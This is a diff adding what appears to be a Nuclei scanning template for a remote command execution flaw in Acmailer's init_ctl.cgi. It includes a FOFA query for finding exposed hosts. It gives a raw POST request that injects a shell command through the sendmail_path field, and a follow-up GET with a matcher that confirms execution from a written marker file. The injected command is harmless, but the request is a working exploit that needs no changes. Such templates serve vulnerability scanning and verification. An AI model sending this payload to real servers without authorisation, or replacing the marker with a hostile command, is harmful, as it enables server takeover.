@@ -1,0 +1,40 @@
+id: Acmailer-init_ctl-RCE
+ 
+info:
+  name: Acmailer邮件系统 init_ctl.cgi 远程命令执行
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa：body="CGI acmailer"
+    Acmailer邮件系统 init_ctl.cgi接口处远程命令执行,攻击者可通过此漏洞获取服务器权限。
+  reference:
+    - 
+  tags: RCE
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  
+http:
+  - raw:
+      - |
+        POST /init_ctl.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Connection: close
+        Content-Length: 150
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+ 
+        admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|echo "pboyjnnrfipmplsukdeczudsefxmywe" >{{filename}}.txt | bash&homeurl=http://&mypath=e
+ 
+      - |
+        GET /{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+ 
+ 
+    matchers:
+      - type: dsl
+        name: 命令执行
+        dsl:
+          - 'status_code==200 && contains_all(body,"pboyjnnrfipmplsukdeczudsefxmywe")'
